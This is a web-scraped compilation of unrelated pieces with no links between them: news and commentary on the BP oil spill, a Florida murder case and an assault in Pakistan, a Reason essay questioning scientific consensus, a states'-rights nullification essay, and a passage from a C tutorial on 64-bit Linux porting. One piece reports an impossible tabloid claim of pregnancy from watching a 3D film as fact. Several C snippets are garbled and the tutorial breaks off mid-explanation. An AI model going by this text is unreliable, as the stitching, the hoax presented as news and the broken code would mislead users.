At a minimum , on a daily basis they should provide a sampling of video recorded at random times throughout the day from both leak sites to allow independent observers an opportunity to judge what is going on and whether anything has changed .
BP will of course dismiss the importance of understanding how much oil is flowing into the Gulf , but the notion that it does n't matter whether we know what is happening beneath the sea is laughable , or at least it would be if this were n't such a serious matter .
You have to give her credit on some level .
She has to be approaching a Guinness record level of stupidity to think anyone would believe her .
She ’d clinch it if after her husband divorces her , she tries to sue the black actor for child support .
The wife of a US Army Soldier , Jennifer Stweart , claims she got pregnant by watching a 3D adult film while visiting friends in New York .
38 - year - old Jennifer Stweart used the bizarre claims to explain to her husband why their child was black , despite the lovers being very much white skinned .
Jennifer Stweart said her child looks just like a black actor in the adult movie she watched in 3D with her east coast pals .
[…]
Stweart also admits her marriage to the US military man who serves overseas could be in trouble : “ Even though my husband believed in me , my marriage could be at risk .
But he knows I ’m faithful ” she said .
Learning and Reflections of a man who needed and needs a savior .
The judge who overturned deepwater drilling bans allowing BP to resume oil extraction in the Gulf of Mexico , had shares in Transocean and other firms in the industry , it was revealed today .
Yesterday , a Louisiana - based judge Martin Feldman ruled that Barack Obama 's six - month drilling moratorium in the Gulf was unjustified because it assumed that all deepwater drilling was as dangerous as BP's .
The White House promised an immediate appeal .
Meanwhile environmental groups have said Feldman 's ruling may have to be rescinded because of the possible conflict of interests .
Feldman 's most recent financial disclosure forms show that he was paid dividends from his shares in Transocean , the firm that owned the Deepwater oil rig that exploded in April killing 11 oil workers , prompting America 's worst environmental disaster .
The forms , which relate to the calendar year 2008 , also show that he sold shares in Halliburton , which was also involved in the disaster .
Feldman 's other interests included Ocean Energy , Quicksilver Resources , Prospect Energy , Peabody Energy , Pengrowth Energy Trust , Atlas Energy Resources , and Parker Drilling .
Obama 's interior department imposed the moratorium last month in the wake of the BP disaster , halting approval of any new permits for deepwater projects and suspending drilling on 33 exploratory wells .
Feldman has yet to respond to the disclosures .
He is one of many federal judges across the Gulf Coast region with money in oil and gas .
Several have disqualified themselves from hearing spill - related claims , while others have sold their holdings so they can preside over many cases being filed .
Josh Reichert , managing director of the Pew Environment Group , said the ruling should be rescinded if he still held such shares .
" If Judge Feldman has any investments in oil and gas operators in the Gulf , it represents a flagrant conflict of interest , " Reichert said .
At least two major oil companies , Shell and Marathon , said they would wait for the appeal before resuming drilling .

UPDATE : Officials confirm that the Deepwater Horizon has sunk :
( CNN ) —
An oil rig that has been burning in the Gulf of Mexico for more than a day has sunk , the U.S. Coast Guard said Thursday .
Lt. Cmdr. Cheri Ben-Iesau of the Coast Guard announced this latest development as the search continued for 11 workers who have been missing since an explosion on the rig Tuesday night off the Louisiana coast .
Crude oil was leaking from the rig at the rate of about 8,000 barrels per day , Coast Guard Petty Officer Ashley Butler said .
The Coast Guard also is preparing for possible leaks of up to 700,000 gallons of diesel fuel but can do little to protect the environment until the fire is out , Butler said .

Unaware of the grisly fate that had befallen Lisa Spence , police investigating her disappearance had her cellphone number assigned to a new phone and sent a text message to their main suspect .
“ Just wait til I got better , ” the message read .
It worked , police say : Minutes after they sent the message , Paul Edwards , 44 , got into his mother ’s car and drove to several South Florida locations , one of which would later lead police to Spence ’s decapitated body .
Edwards was arrested Wednesday on one count of first - degree murder .
On Thursday he was ordered held without bail .

Police accuse him of stabbing Spence , his girlfriend , more than 33 times , cutting off her head and stuffing her body into a barrel , which was found two months later in northern Miami - Dade County .
The head remains missing .
Authorities outlined the investigation in an arrest warrant .
Spence , 35 , disappeared Oct. 7 , and was last seen at the beauty - supply shop where she worked .
After her disappearance , according to the warrant , Edwards sent several text messages from her phone to convince her friends and family she had suddenly left town and gotten a new job .

No one believed it .
It was not Spence ’s habit to send text messages , friends and family told police .
And there was no way she would let her daughter ’s 18th birthday pass on Oct. 14 without calling her in Trinidad and Tobago .
Spence ’s friends told police she was planning to move out of the Miramar apartment she shared with Edwards but did n’t want to gather her belongings while he was home .
And , the warrant said , he had been calling in sick all week .
Spence was a native of Trinidad and Tobago who moved to Florida about four years ago to join a boyfriend from her Caribbean homeland , family members told police .
She worked as a cashier at the beauty - supply shop and at a convenience store .

The arrest warrant contains 10 text messages sent from Spence ’s cellphone to her brother after her disappearance .
“ I am sad because I will miss Paul , ” one message said .
“ With all that happened he was still good to me in the end . ”
The messages indicated Spence was in the Jacksonville area -- “ i do n’t really know d place , ” one said -- but records showed her cellphone never left South Florida , according to the warrant .
Edwards ’ cellphone was always close to her cellphone , police said .
Police decided to prod Edwards on Nov. 5 by having Spence ’s cellphone number assigned to a new phone and using it to text him .

Edwards was apparently unaware that police followed him to several locations , including northern Miami - Dade County , the warrant states .
On Dec. 16 , police returned to an address in Miami Gardens and searched a vacant field .
Two police dogs that specialize in detecting human remains led police to a sealed , 55 - gallon barrel .
The barrel was taken to the Miami - Dade Medical Examiner ’s Office , where it was opened .
Spence ’s remains were inside .
Blood matching the victim was also found in the apartment Edwards and Spence shared and in the back of a rented Toyota Highlander that Edwards admitted driving around the time of Spence ’s disappearance , the arrest warrant said .

One of Spence ’s friends told police he had seen a similar - looking barrel in the apartment Edwards and Spence shared .
Spence would occasionally use the barrel to ship items to Trinidad , the friend said .

A CHRISTIAN barber in Sargodha , Pakistan is recovering from broken bones and other injuries sustained earlier this month after eight Muslims allegedly beat and sodomised him for cutting a young Muslim ’s beard .
Marwat Masih , 29 , initially refused to cut 19 - year - old Qandeel Cheema ’s beard , knowing that Sunni Muslims in the area believe the Koran prohibits it .
But Cheema , a high school student , told Masih that he had lived and studied in Lahore and therefore wanted a more modern look .
I refused to shave his beard , but he showed me his packed bags and said that he would leave the town straight after the shave , and so no one would ever know that I had shaved it .
Eyewitnesses said that as Masih was cutting Cheema ’s beard , the client ’s older brother – local radical Muslim land owner , Shakeel Cheema – spotted what was happening .
Said Masih :
When Shakeel Cheema saw me shaving his younger brother ’s beard , he became angry and started vandalising mirrors , the sound system and chairs , and he desecrated a wooden cross perched on the top of the front mirrors .
He also started beating my head with his shoes .
Witnesses said that Shakeel Cheema shouted orders to his companions to tie Masih up and throw him into the wagon attached to his tractor , and that he ordered his younger brother to leave for Lahore at once .
Masih said that he was blindfolded with a black cloth and taken to an unknown place where he was locked in a room .
An hour later , Shakeel Cheema and seven others arrived and began striking him with clubs , breaking his ribs , a wrist and leg bones .
Masih claimed that Cheema and seven others sodomised him after Cheema said :
Now we are going to teach you a real lesson for shaving the beard of a Muslim man .
Masih added :
I started bleeding and fell unconscious .
The assaulted man was taken by his family to a rural health centre , where doctors treated him for internal bleeding and the broken ribs , leg bones and wrist .
Laal Masih , the barber ’s father , said :
We submitted an application to the Saddr police twice , but they took no action against Shakeel Cheema and his accomplices .
Muhammad Maqsood , a shopkeeper adjacent to Masih ’s barbershop , insisted that the barber deserved the abuse :
He deserves such punishment , as he did something that is forbidden according to the teaching of the Koran and the sunna .
Marwat Masih paid for his crime .
Masih ’s 36 - year - old brother Hassrat Masih said that Gulshan - e - Bashir , the town where Masih has his shop , is infested mainly by radical Muslims .
Last week , the prestigious journal , the Proceedings of the National Academy of Sciences , published an article that tried to assess the relative credibility of climate scientists who " support the tenets of anthropogenic climate change " versus those who do not .
One goal of the study is to " provide an independent assessment of level of scientific consensus concerning anthropogenic climate change . "
The researchers found that 97–98 percent of the climate researchers most actively publishing in the field are convinced of man-made climate change .
In addition , using publication and citation data , the study found that the few climate change dissenters are far less scientifically prominent than convinced researchers .
The article concludes , " This extensive analysis of the mainstream versus skeptical / contrarian researchers suggests a strong role for considering expert credibility in the relative weight of and attention to these groups of researchers in future discussions in media , policy , and public forums regarding anthropogenic climate change . "
Translation : reporters , politicians , and citizens should stop listening to climate change skeptics .
Naturally , there has been some pushback against the article .
For example , Georgia Institute of Technology climatologist Judith Curry who was not pigeonholed in the study told ScienceInsider , " This is a completely unconvincing analysis . "
One of the chief objections to the findings is that peer review is stacked in favor of the consensus view , locking skeptics out of publishing in major scientific journals .
John Christy , a prominent climate change researcher at the University of Alabama in Huntsville who is skeptical of catastrophic claims , asserted that because of " the tight interdependency between funding , reviewers , popularity .
…
We [ skeptical researchers ] are being ' black ? listed , ' as best I can tell , by our colleagues . "
This fight over credibility prompted me to wonder about the role that the concept of a " scientific consensus " has played out in earlier policy debates .
We all surely want our decisions to be guided by the best possible information .
Consider the overwhelming consensus among researchers that biotech crops are safe for humans and the environment — a conclusion that is rejected by the very environmentalist organizations that loudly insist on the policy relevance of the scientific consensus on global warming .
But I digress .
Taking a lead from the PNAS researchers I decided to mine the " literature " on the history of uses of the phrase " scientific consensus . "
I restricted my research to Nexis searches of major world publications , figuring that 's where mainstream views would be best represented .
So how has the phrase " scientific consensus " been used in past policy debates ?
My Nexis search found that 36 articles using that phrase appeared in major world publications prior to my arbitrary June 1985 search cutoff .
One of the first instances of the uses of the phrase appears in the July 1 , 1979 issue of The Washington Post on the safety of the artificial sweetener saccharin .
" The real issue raised by saccharin is not whether it causes cancer ( there is now a broad scientific consensus that it does ) " ( parenthetical in original ) reported the Post .
The sweetener was listed in 1981 in the U.S. National Toxicology Program 's Report on Carcinogens as a substance reasonably anticipated to be a human carcinogen .
Interesting .
Thirty years later , the National Cancer Institute reports that " there is no clear evidence that saccharin causes cancer in humans . "
In light of this new scientific consensus , the sweetener was delisted as a probable carcinogen in 2000 .
Similarly , the Post reported later that same year ( October 6 , 1979 ) a " profound shift " in the prevailing scientific consensus about the causes of cancer .
According to the Post , researchers in the 1960s believed that most cancers were caused by viruses , but now diet was considered the far more important factor .
One of the more important findings was that increased dietary fiber appeared to reduce significantly the incidence of colon cancer .
Twenty years later , a major prospective study of nearly 90,000 women reported , " No significant association between fiber intake and the risk of colorectal adenoma was found . "
In 2005 , another big study confirmed that " high dietary fiber intake was not associated with a reduced risk of colorectal cancer . "
While dietary fiber may not prevent colon cancer , it is associated with lower cardiovascular risk .
In its June 1 , 1984 issue , The Washington Post reported the issuance of a massive new report by the White House science office supporting the scientific consensus that " agents found to cause cancer in animals should be considered ' suspect human carcinogens , ' " and that " giving animals high doses of an agent is a proper way to test its carcinogenicity . "
Although such studies remain a regulatory benchmark , at least some researchers question the usefulness of such tests today .
The December 17 , 1979 issue of Newsweek reported that the Department of Energy was boosting research spending on fusion energy reactors based on a scientific consensus that the break - even point — that a fusion reactor would produce more energy than it consumes — could be passed within five years .
That has n't happened yet and the latest effort to spark a fusion energy revolution , the International Thermonuclear Experimental Reactor , will not be ready for full - scale testing until 2026 .
An article in the June 8 , 1981 issue of The Washington Post cited a spokesman for the American Medical Association opposing proposed federal legislation that would make abortion murder as saying , " The legislation is founded on the idea that a scientific consensus exists that life begins at the time of conception .
We will go up there to say that no such consensus exists . "
It still does n't .
In the years prior to 1985 , several publications reported the scientific consensus that acid rain emitted by coal - fired electricity generation plants belching sulfur dioxide was destroying vast swathes of forests and lakes in the eastern United States .
For example , the March 10 , 1985 New York Times cited environmental lawyer Richard Ottinger , who asserted that there is a " broad scientific consensus " that acid rain is destroying lakes and forests and " is a threat to our health . "
In 1991 , after 10 years and $ 500 million , the National Acid Precipitation Assessment Program study ( as far as I can tell that report is oddly missing from the web ) actually reported , according to a 1992 article in Reason : " The assessment concluded that acid rain was not damaging forests , did not hurt crops , and caused no measurable health problems .
The report also concluded that acid rain helped acidify only a fraction of Northeastern lakes and that the number of acid lakes had not increased since 1980 . "
Nevertheless , Congress passed the 1990 Clean Air Act Amendments that regulate sulfur dioxide emissions through a cap - and - trade scheme .
Acid rain was clearly causing some problems , but was not the wide - scale environmental disaster that had been feared .
Interestingly , the only mention of a scientific consensus with regard to stratospheric ozone depletion by ubiquitous chlorofluorocarbon ( CFCs ) refrigerants was an article in the October 6 , 1982 issue of the industry journal Chemical Week .
That article noted that the National Research Council had just issued a report that had cut estimates of ozone depletion in half from a 1979 NRC report .
The 1982 NRC report noted , " Current scientific understanding … indicates that if the production of two CFCs … were to continue into the future at the rate prevalent in 1977 the steady state reduction in total global ozone … could be between 5 and 9 percent . "
Such a reduction might have been marginally harmful , but not catastrophic .
It was not until 1986 that the mainstream press reported the discovery of the " ozone hole " over Antarctica .
This discovery quickly led to the adoption of an international treaty aiming to drastically reduce the global production of CFCs in 1987 .
( For what it is worth , I supported the international ban of CFCs in my 1993 book Eco - Scam . )
With regard to anthropogenic climate change , my Nexis search of major world publications finds before 1985 just a single 1981 New York Times article .
" There has been a growing scientific consensus that the buildup of carbon dioxide in the atmosphere is creating a ' greenhouse effect ' by trapping some of the earth 's heat and warming the atmosphere , " reported the Times in its January 14 , 1981 issue .
What a difference the passage of 25 years makes .
My Nexis search turned up 457 articles in major publications that in the last year cited or used the phrase " scientific consensus . "
Checking to see how many combined that phrase with " climate change , " Nexis reported that the number comes to 342 articles .
Briefly scanning through a selection of the articles it is clear that some of them involved the controversy over whether or not there is a " scientific consensus " on climate change .
The majority appear to cite various experts and policymakers asserting the existence of a scientific consensus that anthropogenic climate change is dangerous to humanity .
So what to make of this increase in the use of the concept of " scientific consensus ? "
After all , several scientific consensuses before 1985 turned out to be wrong or exaggerated , e.g. , saccharin , dietary fiber , fusion reactors , stratospheric ozone depletion , and even arguably acid rain and high - dose animal testing for carcinogenicity .
One reasonable response might be that anthropogenic climate change is different from the cited examples because much more research has been done .
And yet .
One should always keep in mind that a scientific consensus crucially determines and limits the questions researchers ask .
And one should always worry about to what degree supporters of any given scientific consensus risk succumbing to confirmation bias .
In any case , the credibility of scientific research is not ultimately determined by how many researchers agree with it or how often it is cited by like - minded colleagues , but whether or not it conforms to reality .
Ronald Bailey is Reason 's science correspondent .
His book Liberation Biology : The Scientific and Moral Case for the Biotech Revolution is now available from Prometheus Books .
Disclosure :
For what it is worth I generally accept the current " consensus " that anthropogenic climate change could be a big problem .
I do worry that what governments are likely to do about global warming may be worse than climate change .

Resist DC : The Federal Tax Funds Act
January 21 , 2010
That this Assembly doth explicitly and peremptorily declare , that it views the powers of the federal government , as resulting from the compact , to which the states are parties ; as limited by the plain sense and intention of the instrument constituting the compact ; as no further valid that they are authorized by the grants enumerated in that compact ; and that in case of a deliberate , palpable , and dangerous exercise of other powers , not granted by the said compact , the states who are parties thereto , have the right , and are in duty bound , to interpose for arresting the progress of the evil , and for maintaining within their respective limits , the authorities , rights and liberties appertaining to them .
" The operation of measures thus unconstitutional and illegal ought to be prevented by a resort to other measures which are both constitutional and legal .
It will be the solemn duty of the State governments to protect their own authority over their own militia , and to interpose between their citizens and arbitrary power .
These are among the objects for which the State governments exist "
By Michael Boldin Today the federal government is literally everywhere .
It has its nose in everything , and it has been that way for a long , long time .
In the Kentucky and Virginia Resolutions of 1798 , Thomas Jefferson and James Madison warned us that if the federal government were to have theright to judge the extent of its own powers , its power would continue to grow  regardless of elections , the separation of powers , and other much - touted limits on power .
The principle behind these resolutions , that the power of federal government must be checked by state governments , has gained resurgence in recent years , and is growing more every day .
Fourteen states are now defying federal laws on marijuana .
Nearly two dozen states have rendered the Bush - era Real ID act null and void by passing laws or resolutions refusing to comply with it .
Two states have already passed laws to effectively nullify some federal gun laws or regulations within their borders and more than two dozen others are considering similar legislation .
More than a dozen states are considering legislation to nullify or effectively ban any future national health care plan in their state .
Other states are considering legislation to refuse sending their national guard troops to wars deemed unconstitutional by state governors .
And still others are looking at laws to resist cap and trade legislation .
The principle behind such legislation is nullification .
When a state ' nullifies ' a federal law , it is proclaiming that the law in question is void and inoperative , or ' non-effective , ' within the boundaries of that state ; or , in other words , not a law as far as the state is concerned .
But to simply declare a law null and void is not enough .
Implied in any nullification legislation is enforcement of the state law .
In the Virginia Resolution of 1798 , James Madison wrote of the principle of interposition :
In his famous speech during the war of 1812 , Daniel Webster said :
Here Madison and Webster assert what is implied in nullification laws  that state governments not only have the right to resist unconstitutional federal acts , but that , in order to protect liberty , they are " duty bound to interpose " or stand between the federal government and the people of the state .
The only way to restrain an out of control federal government is through the interposition of state authority to stand in defense of individual life and liberty .
Those sound like nice words , but what does this mean precisely in application ?
In order to restore usurped constitutional authority , a State must be prepared , at some point , to resist federal intrusion .
In the American tradition , there is a long history of States doing just that .
Georgia nullified the Supreme Court 's ruling in Chisholm vs. Georgia ( 1793 ) ; New England States nullified fugitive slave laws ; and earlier New England townships nullified Jefferson 's embargo and the war of 1812 declared under Madison 's administration .
Jefferson said " he felt the foundations of the government shaken under my feet by the New England townships . "
Wisconsin was nullifying what it declared to be usurpations by the Supreme Court into the 1850s .
There was a time when the States kept the central government under control .
When I talk to people about these principles  most agree , like Martin Luther King Jr. said in his famous " Letter from Birmingham jail , " that there is aBut , they 'll often ask , even if states pass laws to nullify unjust and unconstitutional federal acts , the feds will still continue to tax us and punish our states financially for not complying  so what can we REALLY do ?
One idea , which will take a great deal of courage on the part of the People and their state governments , is to establish what 's being called a " Federal Tax Escrow Account " or a " State Authority and Federal Tax Funds Act .
" Already introduced in Georgia ( HB877 ) , Oklahoma ( HB2810 ) , and Washington ( HB2712 ) , such laws would require that all federal taxes come first to the state 's Department of Revenue .
A panel of legislators would assay the Constitutional appropriateness of the Federal Budget , and then forward to the federal government a percentage of the federal tax dollars that are delineated as legal and Constitutionally justified .
The remainder of those dollars would be assigned to budgetary items that are currently funded through federal allocations and grants or returned to the people .
Will the federal government  and its courts  deem such laws constitutional ?
Unlikely , especially in light of the fact that as recently as 2005 the Supreme Court ruled that a person growing a plant on their own property , keeping it at home , and consuming it in their own home was somehow " interstate commerce . "
Rulings such as these show that the courts have little , if any , respect for the rights of the people .
The Supreme Court , with only nine unelected judges , has become the most important policy making body in this country , and makes claim to be the final authority on interpreting the Constitution .
Never in history have so many been ruled by so few .
The essential question , of course , will the people and their state governments have enough courage to push forward anyway ?
Only time will tell .

Porting Linux applications to 64 - bit systems
Tips and techniques for a smooth transition
Linux was one of the first cross- platform operating systems to use 64 - bit processors , and now 64 - bit systems are becoming commonplace in servers and desktops .
Many developers are now facing the need to port applications from 32 - bit to 64 - bit environments .
With the introduction of Intel® Itanium ® and other 64 - bit processors , making software 64 - bit - ready has become increasingly important .
As with UNIX ® and other UNIX - like operating systems , Linux uses the LP64 standard , where pointers and long integers are 64 bits but regular integers remain 32 - bit entities .
Although some high - level languages are not affected by the size differences , others such as the C language may be .
The effort to port an application from 32 bits to 64 bits might range from trivial to very difficult , depending on how these applications were written and maintained .
Many subtle issues can cause problems even in a well - written , highly portable application , so this article outlines these issues and suggests ways to deal with them .
Advantages of 64 bits
32 - bit platforms have a number of limitations that are increasingly frustrating to developers of large applications such as databases , especially those developers who wish to take advantage of advances in computer hardware .
While scientific calculations normally rely on floating - point mathematics , a few applications such as financial calculations need a narrower numeric range but higher precision than floating point offers .
64 - bit math provides this higher precision fixed - point math , with an adequate range .
There is much discussion today in the computer industry about the barrier presented by 32 - bit addresses .
32 - bit pointers can address only 4GB of virtual address space .
You can overcome this limitation , but application development becomes more complicated , and performance is significantly reduced .
As far as language implementation is concerned , the current C language standard allows the " long long " data type to be at least 64 bits .
However , an implementation may define it as a larger size .
Another area that requires improvement is dates .
In Linux , dates are expressed as signed 32 - bit integers representing the number of seconds since January 1 , 1970 .
This turns negative in 2038 .
But in 64 - bit systems , dates are expressed as signed 64 - bit integers , which extends the usable range .
In summary , the 64 - bit architecture has the following advantages :
A 64 - bit application can directly access 4 exabytes of virtual memory , and the Intel Itanium processor provides a contiguous linear address space .
64 - bit Linux allows for file sizes up to 4 exabytes ( 2 to the power of 63 ) , a very significant advantage to servers accessing large databases .
The Linux 64 - bit architecture
Unfortunately , the C programming language does not provide a mechanism for adding new fundamental data types .
Thus , providing 64 - bit addressing and integer arithmetic capabilities involves changing the bindings or mappings of the existing data types , or adding new data types to the language .
Table 1 . 32 - bit and 64 - bit data models
ILP32 LP64 LLP64 ILP64 char 8 8 8 8 short 16 16 16 16 int 32 32 32 64 long 32 64 32 64 long long 64 64 64 64 pointer 32 64 64 64
The difference among the three 64 - bit models ( LP64 , LLP64 , and ILP64 ) lies in the non-pointer data types .
When the width of one or more of the C data types changes from one model to another , applications may be affected in various ways .
These effects fall into two main categories :
Size of data objects .
The compilers align data types on a natural boundary ; in other words , 32 - bit data types are aligned on a 32 - bit boundary on 64 - bit systems , and 64 - bit data types are aligned on a 64 - bit boundary on 64 - bit systems .
This means that the size of data objects such as a structure or a union will be different on 32 - bit and 64 - bit systems .
.
The compilers align data types on a natural boundary ; in other words , 32 - bit data types are aligned on a 32 - bit boundary on 64 - bit systems , and 64 - bit data types are aligned on a 64 - bit boundary on 64 - bit systems .
This means that the size of data objects such as a structure or a union will be different on 32 - bit and 64 - bit systems .
Size of fundamental data types .
Common assumptions about the relationships between the fundamental data types may no longer be valid in a 64 - bit data model .
Applications that depend on those relationships will fail when compiled on a 64 - bit platform .
For example , the assumption sizeof ( int ) = sizeof ( long ) = sizeof ( pointer ) is valid for the ILP32 data model , but not valid for others .
In summary , the compilers align data types on a natural boundary , which means that " padding " will be inserted by the compiler to enforce this alignment , as in a C structure or union .
The members of the structure or union are aligned based on their widest member .
Listing 1 illustrates this structure .
Listing 1 . C structure
struct test { int i1 ; double d ; int i2 ; long l ; }
Table 2 shows the size of each member of the structure and the structure size itself on 32 - bit and 64 - bit systems .
Table 2 . Size of structure and structure members
Structure member Size on 32 - bit system Size on 64 - bit system struct test { int i1 ; 32 - bits 32 - bits 32 - bits filler double d ; 64 - bits 64 - bits int i2 ; 32 bits 32 bits 32 - bits filler long l ; 32 bits 64 bits } ; Structure size 20 bytes Structure size 32 bytes
Note here that on a 32 - bit system , the compiler may not align the variable d , even though it is a 64 - bit object , because the hardware treats it as two 32 - bit objects .
However , a 64 - bit system aligns both d and l causing two 4 - byte fillers to be added .
Porting from 32 - bit to 64 - bit systems
This section shows you how to correct common trouble spots :
Declarations
Expressions
Assignments
Numeric constants
Endianism
Type definitions
Bit shifting
Formatting strings
Function parameters
Declarations
To enable your code to work on both 32 - bit and 64 - bit systems , note the following regarding declarations :
Declare integer constants using " L " or " U " , as appropriate .
Ensure that an unsigned int is used where appropriate to prevent sign extension .
If you have specific variables that need to be 32 - bits on both platforms , define the type to be int .
If the variable should be 32 - bits on 32 - bit systems and 64 - bits on 64 - bit systems , define them to be long .
Declare numeric variables as int or long for alignment and performance .
Donât try to save bytes using char or short .
Declare character pointers and character bytes as unsigned to avoid sign extension problems with 8 - bit characters .
Expressions
In C/C++ , expressions are based upon associativity , precedence of operators and a set of arithmetic promotion rules .
To enable your expression to work correctly on both 32 - bit and 64 - bit systems , note the following rules :
Addition of two signed ints results in a signed int .
Addition of an int and a long results in a long .
If one of the operands is unsigned and the other is a signed int , the expression becomes an unsigned .
Addition of an int and a double results in a double .
Here , the int is converted to a double before addition .
Assignments
Since pointer , int , and long are no longer the same size on 64 - bit systems , problems may arise depending on how the variables are assigned and used within an application .
A few tips in this regard :
Do not use int and long interchangeably because of the possible truncation of significant digits .
For example , do n't do this : int i ; long l ; i = l ;
Do not use an int to store a pointer .
The following example works on a 32 - bit system but fails on a 64 - bit system , because a 32 - bit integer cannot hold a 64 - bit pointer .
For example , do n't do this : unsigned int i , * ptr ; i = ( unsigned ) ptr ;
Do not use a pointer to store an int .
For example , do n't do this : int * ptr ; int i ; ptr = ( int *) i ;
In cases where unsigned and signed 32 - bit integers are mixed in an expression and assigned to a signed long , cast one of the operands to its 64 - bit type .
This will cause the other operands to be promoted to 64 - bits and no further conversion is needed when the expression is assigned .
Another solution is to cast the entire expression such that sign extension occurs on assignment .
For example , consider the problem caused by the following : long n ; int i = - 2 ; unsigned k = 1 ; n = i + k ; Arithmetically , the result should be - 1 in the expression shown in bold above .
But since the expression is unsigned , no sign extension occurs .
The solution is to cast one of the operands to its 64 - bit type ( as in the first line below ) or cast the entire expression ( as in the second line below ) : n = ( long ) i + k ; n = ( int ) ( i + k ) ;
Numeric constants
Hexadecimal constants are commonly used as masks or specific bit values .
Hexadecimal constants without a suffix are defined as an unsigned int if it will fit into 32 - bits and if the high order bit is turned on .
For example , the constant OxFFFFFFFFL is a signed long .
On a 32 - bit system , this sets all the bits , but on a 64 - bit system , only the lower order 32 - bits are set , resulting in the value 0x00000000 FFFFFFFF .
If you want to turn all the bits on , a portable way to do this is to define a signed long constant with a value of - 1 .
This turns all the bits on since twos - compliment arithmetic is used :
long x = - 1L ;
Another problem that might arise is the setting of the most significant bit .
On a 32 - bit system , the constant 0x80000000 is used .
But a more portable way of doing this is to use a shift expression :
1L << ( ( sizeof ( long ) * 8 ) - 1 ) ;
Endianism
Endianism refers to the way in which data is stored , and defines how bytes are addressed in integral and floating point data types .
Little - endian means that the least significant byte is stored at the lowest memory address and the most significant byte is stored at the highest memory address .
Big-endian means that the most significant byte is stored at the lowest memory address and the least significant byte is stored at the highest memory address .
Table 3 shows a sample layout of a 64 - bit long integer .
Table 3 . Layout of a 64 - bit long int
Low address High address Little endian Byte 0 Byte 1 Byte 2 Byte 3 Byte 4 Byte 5 Byte 6 Byte 7 Big endian Byte 7 Byte 6 Byte 5 Byte 4 Byte 3 Byte 2 Byte 1 Byte 0
For example , the 32 - bit word 0x12345678 will be laid out on a big endian machine as follows :
Table 4 . 0x12345678 on a big-endian system
Memory offset 0 1 2 3 Memory content 0x12 0x34 0x56 0x78
If we view 0x12345678 as two half words , 0x1234 and 0x5678 , we would see the following in a big endian machine :
Table 5 . 0x12345678 as two half words on a big-endian system
Memory offset 0 2 Memory content 0x1234 0x5678
However , on a little endian machine , the word 0x12345678 will be laid out as follows :
Table 6 . 0x12345678 on a little - endian system
Memory offset 0 1 2 3 Memory content 0x78 0x56 0x34 0x12
Similarly , the two half - words 0x1234 and 0x5678 would look like the following :
Table 7 . 0x12345678 as two half words on a little - endian system
Memory offset 0 2 Memory content 0x5678 0x1234
The following example illustrates the difference in byte order between big endian and little endian machines .
The C program below will print out " Big endian " when compiled and run on a big endian machine , and " Little endian " when compiled and run on a little endian machine .
Listing 2 . Big endian vs. little endian
#include < stdio.h > main ( ) { int i = 0x12345678 ; if ( *( char *) &i == 0x12 ) printf ( " Big endian
" ) ; else if ( *( char *) &i == 0x78 ) printf ( " Little endian
" ) ; }
Endianism is important when :
Bit masks are used
Indirect pointers address portions of an object
We have bit fields in C and C++ that help to deal with endian issues .
I recommend the use of bit fields rather than mask fields or hexadecimal constants .
There are several functions that are used to convert 16 - bit and 32 - bit from " host - byte - order " to " net - byte - order . "
For example , htonl ( 3 ) , ntohl ( 3 ) are used to convert 32 - bit integers .
Similarly , htons ( 3 ) , ntohs ( 3 ) are used for 16 - bit integers .
However , there is no standard set of functions for 64 - bit .
But Linux provides the following macros on both big and little endian systems :
bswap_16
bswap_32
bswap_64
Type definitions
I recommend that you do not code your applications with the native C/C++ data types that change size on a 64 - bit operating system , but rather use type definitions or macros that explicitly call out the size and type of data contained in a variable .
Some type definitions help make the code more portable .
ptrdiff_t :
A signed integer type that results from subtracting two pointers .
: A signed integer type that results from subtracting two pointers .
size_t :
An unsigned integer and the result of the sizeof operator .
This is used when passing parameters to functions such as malloc ( 3 ) , and returned from several functions such as fred ( 2 ) .
: An unsigned integer and the result of the operator .
This is used when passing parameters to functions such as , and returned from several functions such as .
int32_t , uint32_t etc. :
Define integer types of a predefined width .
, etc. : Define integer types of a predefined width .
intptr_t and uintptr_t :
Define integer types to which any valid pointer to void can be converted .
Example 1 :
The 64 - bit return value from sizeof in the following statement is truncated to 32 - bits when assigned to bufferSize .
int bufferSize = ( int ) sizeof ( something ) ;
The solution is to cast the return value using size_t and assign it to bufferSize declared as size_t as shown below :
size_t bufferSize = ( size_t ) sizeof ( something ) ;
Example 2 :
On a 32 - bit system , int and long are of the same size .
Due to this , some developers use them interchangeably .
This can cause pointers to be assigned to int and vice - versa .
But on a 64 - bit system , assigning a pointer to an int causes the truncation of the high - order 32 - bits .
The solution is to store pointers as pointer types or the special types defined for this purpose , such as intptr_t and uintptr_t .
Bit shifting
Untyped integral constants are of type ( unsigned ) int .
This might lead to unexpected truncation while shifting .
For example , in the following code snippet , the maximum value for a can be 31 .
This is because the type of 1 << a is int .
long t = 1 << a ;
To get the shift done on a 64 - bit system , 1L should be used as shown below :
long t = 1L << a ;
Formatting strings
The function printf ( 3 ) and related functions can be a major source of problems .
For example , on 32 - bit platforms , using %d to print either an int or a long will usually work , but on 64 - bit platforms , this would truncate a long to its least significant 32 - bits .
The proper specification for a long is %ld .
Similarly , when a small integer ( char , short , int ) is passed into printf ( 3 ) , it will be widened to 64 - bits and the sign will be extended if appropriate .
In the example below , the printf ( 3 ) assumes that a pointer is 32 - bits .
char * ptr = &something ;
printf ( %x
" , ptr ) ;
The above code snippet will fail on 64 - bit systems and will display only the lower 4 bytes .
The solution for this is to use the %p specification as shown below , which will work fine on both 32 - bit and 64 - bit systems .
char * ptr = &something ;
printf ( % p
" , ptr ) ;
Function parameters
There are a few things that you need to remember while passing parameters to functions :
In the case where the data type of the parameter is defined by a function prototype , the parameter is converted to that type according the standard rules .
When the type of the parameter is not specified , the parameter is promoted to the larger type .
On a 64 - bit system , integral types are converted to 64 - bit integral types , and single precision floating point types are promoted to double precision .
If a return value is not otherwise specified , the default return value for a function is int .
The problem arises when passing the sum of signed and unsigned ints as long .
Consider the following case :
Listing 3 . Passing the sum of signed and unsigned ints as long
long function ( long l ) ; int main ( ) { int i = - 2 ; unsigned k = 1U ; long n = function ( i + k ) ; }
The above code snippet will fail on 64 - bit systems , because the expression ( i + k ) is an unsigned 32 - bit expression , and when promoted to a long , the sign doesnât extend .
The solution is to cast one of the operands to its 64 - bit type .
There is another problem on register - based systems where registers are used to pass parameters to functions rather than the stack .
Consider the following example :
float f = 1.25 ;
printf ( " The hex value of %f is %x " , f , f ) ;
On a stack - based system , the appropriate hexadecimal value is printed .
But on a register - based system , the hexadecimal value is read from an integer register , not the floating point register .
The solution is to cast the address of the floating point variable to a pointer to an int , which is then de-referenced as shown below :
